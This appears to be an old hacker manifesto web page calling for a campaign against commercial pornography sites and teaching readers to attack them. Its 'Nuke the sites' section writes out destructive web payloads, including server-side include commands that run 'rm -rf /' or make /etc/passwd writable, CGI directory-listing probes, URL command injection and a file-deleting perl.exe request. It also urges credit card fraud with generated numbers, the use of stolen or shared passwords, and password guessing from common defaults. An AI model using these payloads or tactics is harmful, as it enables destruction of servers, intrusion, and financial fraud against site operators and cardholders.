<br><br>
We are not censors, and we have nothing whatsoever against nude images (if 
given away for free), yet we have to wage battle against commercial smut sites 
for many pretty sound reasons. Here the main ones:
<br><br>
Because commercial smut sites are swamping the whole Web. They have long ago swamped, for 
instance, the server where my main page was hosted to a point that made impossible 
for me to remain there. This swamping may seem strange, since there is <a href="c_third.htm">NO REASON 
WHATSOEVER</a> to use or peruse such commercial smut sites. <br>
As anyone that visit these pages of mine knows, if you have learned how to search 
the web there is NOTHING... <a href="tadimens.htm">absolutely nothing that you will not find on the web</a>. 
Any application you can think of, any image that has ever been taken or made, any 
BOOK that has been written, any MUSIC, any FILM, any document, any lore... 
dwells somewhere inside a server on our planet, ready 
to be <a href="c_first.htm">downloaded by you for free</a>. <br>
In such a situation selling "commercially" what is already free is only a 
fraud. Porn sites (but most 'advanced searching' sites as well, come to think of it) are just doing that.<br>
We are compelled to vegetate in a context where 'copyrights' 
laws are just used as fig leaves to cover strong commercial 
interests, where all tricks of the trade are exploited to deny knowledge to 
the 'poors and 
the simple ones' (they want zombie slaves that slurp advertisement and firmly believe 
that 
"real life" is to drool around a noisy vulgar mall buying and/or consuming some useless crap for 
the sake of some corporation).
<br>In this social Hell all kind of 'frill' and 'push' activities are 
fostered heavily in order 
to keep under their consumistic chains (and advertisement whips) those still 
unaware of what's going on around them, the gullible believers in a nonsensical 
society 
where money -and not knowledge- means 
power (why?).
<br><br>
Yet this still surviving web & nether world <u>of ours</u> points (among difficulties and errors) to 
a NEW reality: See and rejoice! You can also (and still) get at (and 
download) all the knowledge (and horrors) of the human race. That is, you 'could'... once 
you know how to find them.<br>
The problem and the difficulty is to understand where exactly -and under which 
<a href="nomomen.htm">name</a> that what you seek has been stored. <br>
This is fairly easy endeavour, though, (as you have understood on my pages), yet many poor suckers 
and lusers simply <u>don't know it</u>, and have -for instance- to pay in order to 
get their daily smut ration... don't laugh at them! Imagine you are a frustrated 
young man, somewhere in Saudi Arabia (or in Idaho&nbsp;:-), with a web access and enough money and yet 
no naked women images (nor many naked <U>real</U> women AROUND 
nor Wodka-Martinis 'comme-il-faut' for that matter :-) 
nowhere in a range of 1000 kilometers... you would probably fall for it as well...
<br><br>
Since, as you know, on the Web there is NO law, reversers are among the few that can 
try to put an end to <u>any</u> activity they happen to dislike. 
<br>'Seekers noblesse' oblige: We decide alone what we allow
and what we forbid, since we HAVE (and spread) real knowledge... after all 
we are the only real "power" 
in these worlds of bytes and codes, where commercial minds stumble around, blinded by 
money... a universe where we can still destroy them, 
and stamp them out if need be, as you will learn here and elsewhere. 
<br><br>
You'll begin to grasp and understand - here - how we can attack our enemies, 
and you may decide to join and help (or 
even criticize and ignore... as usual you are not compelled to agree with our course 
of action).
<br><br>
The proliferation of all kinds of commercial sites is unrelated to their (mostly poor) 
content, and in the case of porn sites is independent from the fact that they are 
offering images that <font color=blue>[</font><a href="c_third.htm">you could 
have for free</a><font color=blue>]</font>, since the people 
that usually fall for these tricks DO NOT KNOW that, all moralisation campaigns 
notwithstanding (that, as usual in this awful society, always stop 
short of attacking the "holy" commercial activities) 
this swamping is simply a <u>consequence</u> of the 'inner working' (or if you prefer the 
'coding choices') of these sites, workings and choices that 
you must understand in order to defeat them, and that we will try to summarize 
here:
<br><br>
Let's see how a "classical" commercial smut works:<br>
<font size=+1>
THE WORKING OF A CLASSICAL COMMERCIAL SMUT SITE</fonT><ol><li>
	You steal a great number of bad scanned smut images from the newsgroups (where 
	anybody could get them for free, of course, but that's for sure completely irrelevant for you).
</li><li>	You get an Internic name like xxxsmuttfickxxx.com for a few dollars (you are
	already a server provider yourself, or you find one for next to nothing)
</li><li>	You buy some bad-written cgi-scripts to get zombies pay for 
some sort of paid 
access to your smut offerings.
</li><li>	You realise that almost nobody comes
</li><li>	You spam every usenet group you can get your hands on in order to get some 
	idiot to visit your site, in the hope they will pay you some money
</li><li>	You realise that almost nobody comes
</li><li>	You prepare a real ugly smut image as "banner-ad" and exchange it with one 
	hundred other smut sites, hoping that the small park of frustrated rich idiots 
	that roam these sites (and pay for them) will waste some dollars on your site as well.
</li><li>	You realise that almost nobody comes
</li><li>	You specialise in nastier and nastier smut images ("lolitas swallowing horses" 
	"pregnant teenagers tortured by lorry drivers" or whatever)
</li><li>	You swamp whole servers with the same poor images yet with twenty differently 
	named "entrances" to the same (poor) content you have copycatted on the web.
</li><li>	You spam and spam and spam and swamp and swamp and swamp
</li><li>	You realise that most people that seek this kind of images 
still prefer to get them for free
</li><li>	Ahah! You write the word "free" everywhere in your commercial 
smut site hoping to 
	get somehow inside the search engines listings for 'free smut' images.
</li><li>	You eventually scrap a couple of bucks from your dirty floor 
and swallow them.
</li></ol>
<font size=+1>
WHAT CAN WE DO AGAINST THEM?</fonT>
<br><br>
Well, there are some possible line of actions:

<br><br>	Nuke the sites
<br><br>
	This is far from easy, and you need some particular conditions to 
	be able to do it, yet it is great fun. You'll get some hints and 
	some simple tricks on my "cgi reverse engineering" pages <IMG SRC="images/bulletr.gif"  ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
BORDER=0 VSPACE=0 HSPACE=0><a href="ideale3.htm" >one</a> and <IMG SRC="images/bulletr.gif"  ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
BORDER=0 VSPACE=0 HSPACE=0><a href="ideale4.htm" >two</a>.
<br><br>
	Basically you just write something like<pre>
			#exec cmd="chmod 666 /etc/passwd"</pre>
	for SSI servers <br>
	or add something like the following to the http://www.yoursmuttarget.
<font color=red>com</font><br>
			<font color=red>com</font>/cgi-bin/test-cgi?*<br>
			<font color=red>com</font>/cgi-bin/nph-test-cgi?/*<br>
			<font color=red>com</font>/cgi-bin/nph-test-cgi?etc/*<br>
	or add to your target URL<pre>
%0a/bin/ls%20-la%20/usr/src/include</pre>
	or submit a tag like the following one:<pre>	
&lt;!--#exec cmd=&quot;/bin/rm -rf /&quot;--&gt;</pre>
	or if the perl.executable is there run it with this URL:<pre>
http://hostname/cgi-bin/perl.exe?-e+unlink+%3C*.*%3E%3B</pre>
	and nuke the smut site for a while :-)<br>
	And all this is just to SEE if you can play a little with them (a real 
	"complete" attack is of course a little more complicated).<br>

<br><br>	
	Don't forget that you don't need to respect smut sites!<br>Use credit card generators 
to get a faked but working credit card number (test it on geocities 'kids' facility until you 
find a working one). Once you are inside the smut site, either nuke it or post immediately its 
complete subdirectory structure on usenet (even worse: nuking will last only some time, but 
re-creating the whole subdir structure can be a hassle :-)<br><br>

If you don't want to use faked credit card numbes, don't forget that you can also enter smut sites using 
FALSE passwords. There are in the warez
	scene hundred of sites that offer 'capered' passwords for commercial smut sites, 
	one of the rare occurrencies where I'm fully favourable to the warez kids.<br> Million of
	frustrated smut-seekers use these free passwords in order to gain access to the 
	smut sites WITHOUT paying them. This is IMO very good because this does not only 
	damage the smut sites... in fact most of these simpletons realise in this way very 
	soon, how bogus all these commercial smut sites are and won't in their life never 
	come to the idea of paying for access again.<br>

	The Commercial smut sites react against password capering with automated scripts that 
	deconnect all accounts used by two persons on the same time. Yet web server-user 
	notifications protocols are so unreliable that most of the time they just don't dare 
	pushing it really too much, and default to a completely useless warning, because 
there are 
	much too many dynamic IDs, and the real fear of these sites is to scare off 
one of the few 
	gullible "correct users" they have got. So everytime you get a "scarecrow" message 
visiting 
	with capered passwords, just reload until it disappears.
<br><br>
	You can also enter these sites using gathered 'crumbs' that you'll find on the source
	html script of the page. Useful crumb gathering is often possible through right 
	clicking onto any logo, or image, and carefully watching and registering the URL
	call sequence through your logger or personal firewall.<br>

<br>	Study and crack the friends of your enemies<br>
	Many commercial smut sites resort to 'commercial smut verificators', which pay them
	'per visit' and take care of the whole verification routines. While this offers a
	better security on one site  of the medal (good thought 
cgi-scripts protections schemes can be certainly tougher than the home-made concoctions), 
this means 
	also that once you have cracked one of these schemes you have cracked all of the sites that 
use it.
	<br><br>
		Beat them at their own game demonstrating that they are utterly useless<br>
	There is practically not a single image on the commercial smut sides that 
	you could not have for free if you cared to. Yet, instead of leaving these 
	images where only determined people would have found them (why not, if someone 
	wants to see them, he should be free to do so), the commercial smut sites throw all
	these images everywhere on the web, making it dead easy, even for childrens, 
	to get exposed even if they ARE NOT seeking porn (and since I have 
	three kids, I know what I am saying... if you want to have a look for yourself
	at what kind of smut you can get without any filter whatsoever, visit Giglio's 

<font color=blue>[</font><a href="c_third.htm">third</a><font color=blue>]</font> classroom).
<br><br>
	This situation is of course just one of the many nasty consequence of the awful 
society where we live in, where everything 
	is measured only through its 'commercial' value, even people and bodies. Yet 
	there is no reason we should accept this. Since nuking the commercial smut 
	sites, while being great fun  does not seem to bring us nowhere (there are simply 
	too many of them and they proliferate like champignons), I am considering writing 
simple robots that will "dig out" automatically  
	all sort of smut images publishing (and updating) these links automatically on 
	the usenet relevant groups, where part of the suckers that PAY the commercial smut 
	sites roams. This should damage smut sites where it really 
	hurts them: on their commercial site :-)<br><br>
	So a good counter-offensive could be to publish on the relevant usenet
	groups (say once every week, through an automated bot):<ol><li>	either a list of all password capering sites;
	</li><li>	or a list of all the many really free smut sites (which exist but 
		are fairly difficult to find due to the fraudulent proliferation of 
		the adjective 'free' inside the commercial smut sites);
	</li><li>	or a list of all the hidden links inside the main smut sites;
	</li><li>	or some cracking / reversing tutorials for the PASSWORD ASKING AND CHECKING applets;
	</li><li>	or some easy robots that would allow any luser to gather whatever 
		images he (thinks he) needs.</li></ol>
	I believe that sending all these info to every warez sites (which are all 
	concurring against another -for bucks- as well, and would tehrefore immediatly 
	publish everything you feed them, just in order to gain some more hits :-) would 
	inflict a more lasting damage to the whole commercial smut scene.
	<br><br>
	Since the commercial smut sites cannot afford to change continuously the 
	whole subdirectory naming structure, the publishing of the hidden links and 
	subdirectories structure could be even more effective that the traditional publishing 
	of the passwords or the occasional nuking of a couple of exposed site.

	We will examine  how exactly a userid/password script works, and 
	how it 'decides' if the user should gain access to the site or not. There
	are now some new censorship applications that check THE (rosa) PIXELS of the 
	images in order to allow or forbid to 'corporate prisoners' to see them.
	We could therefore reverse the algorithms of these very censorship appz in order to 
obtain the opposite, and 
	FIND where such images have been hidden. Such a little 
	bot could then be released for free to the zombies... smut seekers will thus get 
	<u>for free</u> their smut-dope,  automagically brought home, and commercial smut sites 
	will fail miserably as they deserve... hey! this could be (ahem) very useful against 
	any sort of commercial site as well, come to think of it :-)
<br><br>
	Another very interesting sector is PASSWORD CAPERING. If you have a closer 
	look at the passwords and userids used by the commercial sites (not only smut 
	sites) you'll soon realise that they are divided in TWO main categories:
	user-chosen and automatically generated.<br>
	Both approaches have weaknesses, as we know: <br>
"user chosen" passwords are repetitive, Johnny the bozo cannot remember anything more complicated than 
the name 'coke':<pre>
	fred/fred 	(look at the letters "fred" on your keyboard)
	1111/1111
	1234/1234
	pamela/pamela	
	userid/password	(ofter that you would think)</pre>
That's the reason some commercial site 'assign' you your password:<pre>
	REDD12JH31/444JAH12@1
	99981-2312/RRAE112-43</pre>
And as all reversers know, in that case there is nothing easier than crack the algorithms 
that assign valid passwords in such a way. Just download the relative applets or, even 
more simply, have a quick (reverser :-) look at a small list of valid passwords, that you can 
collect at ease from 
the many password warez sites.
<br><br>
 
It is clear that this project will only survive and thrive if there will be 
more and more essays from ALL OF YOU and if you will find and send me other 
-even better- tricks in order to commercial ruin (or at least to seriously annoy) 
all those bastards that run the commercial smut sites. 

<br><br>
Some lusers believe that money and sex are the two only things that count in life, and 
that 'combining' the two, they may have found an easy way to scrap some easy bucks. Let's 
show them that in <u>our</u> world money does not mean anything at all and that even if sex 
would really have something to do with poor quality smut images, 
which I doubt, that too can be gathered <i>en masse</i> on the web <u>for free</u>, like everything else. 
 <br><br>
I hope you understand now WHY I want to bust commercial sites (apart from the 'intrinsecal' 
fun in busting web sites :-) and WHY this has nothing to do with any censorship attitude of 
mine: <font color=blue>I am a reverser and a seeker: I want a free web with 
free resources for anyone and I'm gonna struggle for it if necessary</fonT>.</pRE>
